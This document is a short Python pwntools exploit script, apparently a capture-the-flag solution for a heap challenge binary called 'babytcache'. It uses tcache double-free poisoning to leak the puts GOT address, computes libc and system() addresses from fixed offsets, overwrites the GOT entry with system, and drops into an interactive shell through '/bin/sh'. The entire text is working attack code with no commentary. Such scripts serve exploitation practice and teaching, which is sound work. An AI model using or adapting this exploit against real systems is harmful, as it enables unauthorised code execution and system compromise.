from pwn import *

r = process('./babytcache')

symbol = ELF('./babytcache')

if args.G:
    gdb.attach(r)

def add_note(content):

	r.recvuntil('>')
	r.sendline('1')
	r.recvuntil('content:')
	r.sendline(content)
	
def delete_note(index):

	r.recvuntil('>')
	r.sendline('2')
	r.recvuntil('index:')
	r.sendline('%d'%index)

def show_note(index):

	r.recvuntil('>')
	r.sendline('3')
	r.recvuntil('index:')
	r.sendline('%d'%index)

add_note('aaaaaaaa')

delete_note(0)

delete_note(0)

delete_note(0)

add_note(p64(0x6020e0+0x8))

add_note('bbbb')

add_note(p64(symbol.got['puts']))

show_note(1)

puts_addr = (u64(r.recv(6)+ '\x00\x00')) #receive 'puts'
print hex(puts_addr)
padding1 = 0x809c0

padding2 = 0x4f440

libc_addr = puts_addr - padding1

system_addr = libc_addr + padding2

print hex(libc_addr)

print hex(system_addr)

r.sendline('2')

r.recvuntil('index:')

r.sendline('0')

delete_note(0)

delete_note(0)

add_note(p64(symbol.got['puts']))

add_note('/bin/sh')

add_note(p64(system_addr))

r.sendline('3')
r.sendline('0')
delete_note(0)

r.interactive()
